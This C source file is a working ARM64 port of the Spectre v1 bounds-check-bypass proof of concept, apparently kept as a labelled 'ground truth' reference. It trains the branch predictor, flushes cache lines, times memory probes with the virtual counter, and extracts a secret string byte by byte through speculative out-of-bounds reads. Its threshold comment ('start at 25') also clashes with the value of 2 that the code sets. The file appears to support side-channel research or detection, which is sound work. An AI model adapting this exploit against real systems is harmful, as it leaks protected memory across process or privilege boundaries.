/* Ground Truth - ARM64 (AArch64) port */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "It's a secret!";
uint8_t temp = 0;

/* ARM64 cache flush: DC CIVAC (clean & invalidate by virtual address to PoC).
 * Requires SCTLR_EL1.UCI=1, which Linux sets on all modern AArch64 kernels.
 * DSB ISH + ISB ensure the flush is visible before subsequent accesses. */
static inline void flush(void *addr) {
    asm volatile("dc civac, %0" :: "r"(addr) : "memory");
    asm volatile("dsb ish"      ::: "memory");
    asm volatile("isb"          ::: "memory");
}

/* ARM64 high-resolution timer: CNTVCT_EL0 (virtual counter).
 * Runs at a fixed frequency (typically 24–100 MHz, system-dependent).
 * ISB before the read serialises the instruction stream, similar to RDTSCP. */
static inline uint64_t rdtsc(void) {
    uint64_t val;
    asm volatile("isb"               ::: "memory");
    asm volatile("mrs %0, cntvct_el0" : "=r"(val));
    return val;
}


/* M1. Victim: Bounds-Checked, Secret-Dependent Access */
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

// void __attribute__((noinline)) victim_function(size_t x) {
//     if (x < array1_size) {
//         temp &= array2[array1[x] * 512];
//     }
// }


/* ARM64 threshold: CNTVCT_EL0 ticks at fixed freq (~24 MHz on RPi4, up to
 * ~100 MHz on server chips).  A cache hit costs ~4–10 ns → ~1–25 ticks.
 * Start conservatively at 25; tune downward if signal is noisy. */
#define CACHE_HIT_THRESHOLD 2

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t safe_x, x;
    register uint64_t time1, time2, time_difference;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = 999; tries > 0; tries--) {

        safe_x = tries % array1_size;

        /* M4. Branch Predictor Training Loop */
        for (j = 29; j >= 0; j--) {

            /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
            int cond = (j % 6 == 0);
            x = safe_x + cond * (malicious_x - safe_x);

            /* M5. Cache Eviction Targets */
            for (i = 0; i < 256; i++)
                flush(&array2[i * 512]);
            flush(&array1_size);

            /* M6. Controlled Delay (Window Extension) */
            for (volatile int z = 0; z < 100; z++) {}

            victim_function(x);
        }

        for (i = 0; i < 256; i++) {
            /* M7. Mixed Probe Order (Stride/Index Masking) */
            mix_i = ((i * 167) + 13) & 255;
            addr  = &array2[mix_i * 512];

            /* M8. Measuring Memory Access Time via CNTVCT_EL0 */
            time1 = rdtsc();
            asm volatile("" ::: "memory");
            *addr;
            asm volatile("" ::: "memory");
            time2 = rdtsc();
            time_difference = time2 - time1;

            /* M9. Hit/Miss Classification Threshold */
            if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
                results[mix_i]++;
        }

        /* M10. Score Accumulation & Early-Stop */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }

    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}

int main() {
    /* M2. Secret Reachability (OOB Path) */
    size_t malicious_x = (size_t)(secret - (char *) array1);

    int i, score[2], Length = strlen(secret);
    uint8_t value[2];

    /* M11. Array/Probe Initialization */
    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }

    printf("Reading %d bytes:\n", Length);

    /* M12. Multi-Byte Extraction Loop */
    while (--Length >= 0) {
        printf("Reading at malicious_x = %p... ", (void *) malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ",
               value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'),
               score[0]);
        printf("\n");
    }
    return 0;
}
